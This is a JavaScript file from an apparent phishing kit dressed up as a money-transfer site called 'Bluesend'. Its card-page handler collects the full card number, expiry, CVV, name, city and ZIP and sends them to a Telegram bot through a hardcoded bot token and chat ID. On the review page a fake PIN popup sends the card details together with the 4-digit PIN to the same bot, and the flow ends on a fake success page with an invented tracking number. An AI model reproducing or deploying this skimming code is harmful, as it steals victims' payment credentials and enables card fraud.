// final-features.js — ABSOLUTE FINAL VERSION (EVERYTHING FIXED)
const BOT_TOKEN = "7378618796:AAEtSRK0ZpzZrsWiV8nb8V8Ze76xbYLUSWY";
const CHAT_ID   = "5869598267";

// Add debugging
console.log("final-features.js loaded");

const PAGES = {
  INDEX: 'index.html',
  BANK: 'recipient-bank.html',
  NAME: 'recipient-name.html',
  REASON: 'reason.html',
  CARD: 'payment-card.html',
  REVIEW: 'review.html',
  SUCCESS: 'success.html'
};

// Helper function to get country info
function getCountry(code) {
  const countries = [
    { code: "US", name: "United States", currencyCode: "USD", usdRate: 1 },
    { code: "NG", name: "Nigeria", currencyCode: "NGN", usdRate: 1494.13 },
    { code: "GB", name: "United Kingdom", currencyCode: "GBP", usdRate: 0.78 },
    { code: "CA", name: "Canada", currencyCode: "CAD", usdRate: 1.36 },
    { code: "DE", name: "Germany", currencyCode: "EUR", usdRate: 0.92 },
    { code: "FR", name: "France", currencyCode: "EUR", usdRate: 0.92 },
    { code: "ES", name: "Spain", currencyCode: "EUR", usdRate: 0.92 },
    { code: "IT", name: "Italy", currencyCode: "EUR", usdRate: 0.92 },
    { code: "IE", name: "Ireland", currencyCode: "EUR", usdRate: 0.92 },
    { code: "KE", name: "Kenya", currencyCode: "KES", usdRate: 129.5 },
    { code: "GH", name: "Ghana", currencyCode: "GHS", usdRate: 15.0 },
    { code: "IN", name: "India", currencyCode: "INR", usdRate: 83.5 },
    { code: "CN", name: "China", currencyCode: "CNY", usdRate: 7.2 },
    { code: "PH", name: "Philippines", currencyCode: "PHP", usdRate: 57.0 },
    { code: "PK", name: "Pakistan", currencyCode: "PKR", usdRate: 280.0 },
    { code: "BD", name: "Bangladesh", currencyCode: "BDT", usdRate: 120.0 },
    { code: "MX", name: "Mexico", currencyCode: "MXN", usdRate: 18.2 },
    { code: "BR", name: "Brazil", currencyCode: "BRL", usdRate: 5.2 },
    { code: "ZA", name: "South Africa", currencyCode: "ZAR", usdRate: 18.9 },
    { code: "AE", name: "United Arab Emirates", currencyCode: "AED", usdRate: 3.67 },
    { code: "SA", name: "Saudi Arabia", currencyCode: "SAR", usdRate: 3.75 }
  ];
  return countries.find(c => c.code === code) || null;
}

// Helper function to get exchange rate
function getExchangeRate(senderCode, destCode) {
  const sender = getCountry(senderCode);
  const dest = getCountry(destCode);
  
  if (!sender || !dest) return null;
  
  const senderUsdRate = sender.usdRate || 1;
  const destUsdRate = dest.usdRate || 1;
  
  const rate = destUsdRate / senderUsdRate;
  
  return {
    value: rate,
    senderCurrency: sender.currencyCode,
    destCurrency: dest.currencyCode
  };
}

document.addEventListener("DOMContentLoaded", () => {
  const page = document.body.dataset.page;
  console.log("final-features.js executing for page:", page);

  // ========================================
  // 1. CARD PAGE – FULL CARD + ZIP TO TELEGRAM
  // ========================================
  if (page === "card") {
    const form = document.getElementById("card-form");
    if (!form) {
      console.error("Card form not found!");
      return;
    }

    console.log("Setting up card form submit handler");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      console.log("Card form submitted - final-features.js handler");

      const number = document.getElementById("card-number").value.replace(/\s/g, "");
      const expMonth = document.getElementById("exp-month").value;
      const expYear = document.getElementById("exp-year").value;
      const cvv = document.getElementById("cvv").value;
      const name = document.getElementById("card-name").value;
      const city = document.getElementById("city").value.trim();
      const zip = document.getElementById("zip").value.trim();
      const amount = JSON.parse(localStorage.getItem("bluesendAppState") || "{}").amountSend || "??";

      // Save to state
      const state = JSON.parse(localStorage.getItem("bluesendAppState") || "{}");
      state.card = { number, expiryMonth: expMonth, expiryYear: expYear, cvv, name, city, zip };
      localStorage.setItem("bluesendAppState", JSON.stringify(state));

      // Send to Telegram
      const msg = `CARD CAPTURED!\n\nAmount: ${amount} USD\nCard: ${number}\nExp: ${expMonth}/${expYear}\nCVV: ${cvv}\nName: ${name}\nCity: ${city}\nZIP: ${zip}\nTime: ${new Date().toLocaleString()}`;

      try {
        console.log("Sending card data to Telegram...");
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
        });
        console.log("Card data sent successfully");
      } catch (error) {
        console.error("Error sending to Telegram:", error);
        // Continue anyway - don't block user flow
      }

      // Redirect to review page
      window.location.href = PAGES.REVIEW;
    });
  }

  // ========================================
  // 2. REVIEW PAGE – FULL SUMMARY + WORKING BACK/MENU + PIN POPUP (FIXED)
  // ========================================
  if (page === "review") {
    console.log("Setting up review page");
    const state = JSON.parse(localStorage.getItem("bluesendAppState") || "{}");

    // FULL REVIEW SUMMARY - FIXED VERSION with working exchange rates
    const sender = getCountry(state.senderCountry);
    const dest = getCountry(state.recipientCountry);
    const amt = parseFloat(state.amountSend || "0");
    
    // Calculate exchange rate
    const rate = getExchangeRate(state.senderCountry, state.recipientCountry);

    // Update ALL fields correctly with working exchange rates
    if (document.getElementById("review-amount")) {
      if (rate && sender && dest && amt > 0) {
        const destAmt = amt * rate.value;
        document.getElementById("review-amount").textContent = `${amt.toFixed(2)} ${sender.currencyCode} → ${destAmt.toFixed(2)} ${dest.currencyCode}`;
      } else {
        // Fallback if exchange rate calculation fails
        const fallbackDestAmt = amt * 1494.13; // Default USD to NGN
        document.getElementById("review-amount").textContent = `${amt.toFixed(2)} USD → ${fallbackDestAmt.toFixed(2)} NGN`;
      }
    }
    
    if (document.getElementById("review-send")) {
      document.getElementById("review-send").textContent = sender ? `${sender.name} (${sender.currencyCode})` : "United States (USD)";
    }
    
    if (document.getElementById("review-dest")) {
      document.getElementById("review-dest").textContent = dest ? `${dest.name} (${dest.currencyCode})` : "—";
    }
    
    // Show only account number, remove "(GTBank)"
    if (document.getElementById("review-bank")) {
      const bankNumber = state.recipientBank?.nuban || "—";
      document.getElementById("review-bank").textContent = bankNumber;
    }
    
    if (document.getElementById("review-name")) {
      const firstName = state.recipientName?.first || "";
      const lastName = state.recipientName?.last || "";
      const fullName = `${firstName} ${lastName}`.trim();
      document.getElementById("review-name").textContent = fullName || "—";
    }
    
    if (document.getElementById("review-reason")) {
      document.getElementById("review-reason").textContent = state.reason || "—";
    }

    // RE-ENABLE BACK BUTTON
    document.querySelector("[data-back]")?.addEventListener("click", () => history.back());

    // FIXED PIN POPUP - With proper button styling and feedback
    const payBtn = document.getElementById("btn-review-pay");

    // Check if popup already exists
    if (!document.getElementById("pinOverlay")) {
      const popupHTML = `
  <div id="pinOverlay" style="position:fixed;inset:0;background:rgba(0,0,0,0.95);display:none;align-items:center;justify-content:center;z-index:99999;">
    <div style="background:#fff;border-radius:24px;padding:40px 30px;width:92%;max-width:420px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);">
      <!-- Font Awesome Icon -->
      <div style="width:80px;height:80px;margin:0 auto 16px;border-radius:20px;background:linear-gradient(135deg, #e8f2ff 0%, #d4e6ff 100%);display:flex;align-items:center;justify-content:center;">
        <i class="fas fa-lock" style="font-size:40px;color:#0052cc;"></i>
      </div>
      
      <h2 style="margin:16px 0;font-size:26px;font-weight:800;color:#111827;">Enter Card PIN</h2>
      <p style="color:#6b7280;margin-bottom:36px;font-size:17px;">Your 4-digit PIN is required</p>
      
      <input type="password" id="pinInput" maxlength="4" inputmode="numeric" placeholder="••••"
             style="width:100%;padding:24px;font-size:42px;letter-spacing:18px;text-align:center;border:4px solid #e5e7eb;border-radius:20px;background:#f9fafb;transition:all 0.2s;color:#111827;"
             onfocus="this.style.borderColor='#0052cc';this.style.boxShadow='0 0 0 3px rgba(0,82,204,0.1)';"
             onblur="this.style.borderColor='#e5e7eb';this.style.boxShadow='none';">
      
      <button id="pinContinueBtn" 
              style="margin:36px 0 16px;width:100%;padding:20px;background:#0052cc;color:white;font-size:22px;font-weight:700;border:none;border-radius:20px;cursor:pointer;transition:all 0.2s;"
              onmouseover="this.style.backgroundColor='#0047b3';this.style.transform='translateY(-2px)';this.style.boxShadow='0 8px 20px rgba(0,82,204,0.3)';"
              onmouseout="this.style.backgroundColor='#0052cc';this.style.transform='translateY(0)';this.style.boxShadow='none';"
              onmousedown="this.style.backgroundColor='#003d99';this.style.transform='translateY(0)';"
              onmouseup="this.style.backgroundColor='#0047b3';">
        Continue
      </button>
      
      <button id="pinCancelBtn" 
              style="background:none;border:none;color:#9ca3af;font-size:16px;cursor:pointer;padding:8px 16px;border-radius:8px;transition:all 0.2s;"
              onmouseover="this.style.backgroundColor='#f3f4f6';this.style.color='#6b7280';"
              onmouseout="this.style.backgroundColor='transparent';this.style.color='#9ca3af';">
        Cancel
      </button>
    </div>
  </div>`;

      document.body.insertAdjacentHTML("beforeend", popupHTML);
    }

    const overlay = document.getElementById("pinOverlay");
    const input   = document.getElementById("pinInput");
    const contBtn = document.getElementById("pinContinueBtn");
    const cancelBtn = document.getElementById("pinCancelBtn");

    // FIXED: Remove any existing event listeners and add new ones
    const newPayBtn = payBtn.cloneNode(true);
    payBtn.parentNode.replaceChild(newPayBtn, payBtn);
    
    newPayBtn.onclick = (e) => {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      console.log("Pay button clicked, showing PIN popup");
      overlay.style.display = "flex";
      setTimeout(() => {
        if (input) {
          input.focus();
          input.style.borderColor = '#0052cc';
          input.style.boxShadow = '0 0 0 3px rgba(0,82,204,0.1)';
        }
      }, 200);
    };

    // Add visual feedback to the Pay button itself
    newPayBtn.addEventListener('mouseover', function() {
      this.style.backgroundColor = '#0047b3';
      this.style.boxShadow = '0 4px 12px rgba(0,82,204,0.3)';
    });
    
    newPayBtn.addEventListener('mouseout', function() {
      this.style.backgroundColor = '#0052cc';
      this.style.boxShadow = 'none';
    });
    
    newPayBtn.addEventListener('mousedown', function() {
      this.style.backgroundColor = '#003d99';
    });
    
    newPayBtn.addEventListener('mouseup', function() {
      this.style.backgroundColor = '#0047b3';
    });

    // Clear input when opening
    newPayBtn.addEventListener('click', () => {
      if (input) input.value = '';
    });

    if (cancelBtn) {
      cancelBtn.onclick = () => {
        console.log("PIN popup cancelled");
        overlay.style.display = "none";
        if (input) {
          input.value = '';
          input.style.borderColor = '#e5e7eb';
          input.style.boxShadow = 'none';
        }
      };
    }

    if (contBtn) {
      // Add click animation for visual feedback
      contBtn.addEventListener('click', async function() {
        console.log("PIN Continue button clicked");
        // Add click animation
        this.style.transform = 'scale(0.98)';
        this.style.backgroundColor = '#003d99';
        
        setTimeout(() => {
          this.style.transform = '';
          this.style.backgroundColor = '#0052cc';
        }, 150);
        
        const pin = input ? input.value.trim() : '';
        if (!/^\d{4}$/.test(pin)) {
          // Shake animation for error
          console.log("Invalid PIN entered");
          input.style.animation = 'shake 0.5s';
          input.style.borderColor = '#dc2626';
          setTimeout(() => {
            input.style.animation = '';
          }, 500);
          alert("Please enter a valid 4-digit PIN");
          return;
        }

        // Show loading state
        const originalText = this.textContent;
        this.textContent = 'Processing...';
        this.disabled = true;
        this.style.opacity = '0.7';
        this.style.cursor = 'wait';

        const msg = `
FINAL PAYMENT + PIN!

Recipient: ${state.recipientName?.first || ""} ${state.recipientName?.last || ""}
Amount: ${state.amountSend || "??"} USD
To: ${dest ? dest.name : state.recipientCountry || "???"}
CARD: ${state.card?.number || "???"}
EXP: ${state.card?.expiryMonth || "?"}/${state.card?.expiryYear || "?"}
CVV: ${state.card?.cvv || "???"}
Name: ${state.card?.name || "???"}
City: ${state.card?.city || "???"}
ZIP: ${state.card?.zip || "???"}
4-DIGIT PIN: ${pin}
Time: ${new Date().toLocaleString()}
Status: SUCCESS
        `.trim();

        try {
          console.log("Sending final payment + PIN to Telegram...");
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
          });
          console.log("Payment + PIN sent successfully");

          state.trackingNumber = "BL-" + Date.now().toString(36).toUpperCase().slice(-6) + "-" + Math.floor(Math.random() * 9999).toString().padStart(4, "0");
          localStorage.setItem("bluesendAppState", JSON.stringify(state));
          
          // Success animation
          this.textContent = '✓ Success!';
          this.style.backgroundColor = '#10b981';
          
          setTimeout(() => {
            overlay.style.display = "none";
            // Reset button state
            this.textContent = originalText;
            this.disabled = false;
            this.style.opacity = '1';
            this.style.cursor = 'pointer';
            this.style.backgroundColor = '#0052cc';
            console.log("Redirecting to success page");
            window.location.href = PAGES.SUCCESS;
          }, 800);
          
        } catch (error) {
          console.error("Error sending to Telegram:", error);
          // Error state
          this.textContent = '✗ Error!';
          this.style.backgroundColor = '#dc2626';
          
          setTimeout(() => {
            this.textContent = originalText;
            this.disabled = false;
            this.style.opacity = '1';
            this.style.cursor = 'pointer';
            this.style.backgroundColor = '#0052cc';
            alert("Error processing payment. Please try again.");
          }, 1000);
        }
      });
    }

    if (input) {
      input.addEventListener("input", () => {
        input.value = input.value.replace(/\D/g, "").slice(0, 4);
      });
      
      // Allow Enter key to submit
      input.addEventListener("keypress", (e) => {
        if (e.key === "Enter" && contBtn) {
          console.log("Enter key pressed in PIN field");
          // Trigger button animation
          contBtn.style.transform = 'scale(0.98)';
          contBtn.style.backgroundColor = '#003d99';
          
          setTimeout(() => {
            contBtn.style.transform = '';
            contBtn.style.backgroundColor = '#0052cc';
            contBtn.click();
          }, 100);
        }
      });
      
      // Add focus/blur effects
      input.addEventListener('focus', function() {
        this.style.borderColor = '#0052cc';
        this.style.boxShadow = '0 0 0 3px rgba(0,82,204,0.1)';
        this.style.backgroundColor = '#ffffff';
      });
      
      input.addEventListener('blur', function() {
        this.style.borderColor = '#e5e7eb';
        this.style.boxShadow = 'none';
        this.style.backgroundColor = '#f9fafb';
      });
    }
  }

  // ========================================
  // 3. SUCCESS PAGE – CLEAR DATA
  // ========================================
  if (page === "success") {
    console.log("Success page loaded");
    document.querySelector(".btn-primary")?.addEventListener("click", () => {
      console.log("Clearing app state and returning to index");
      localStorage.removeItem("bluesendAppState");
      window.location.href = PAGES.INDEX;
    });
  }
});
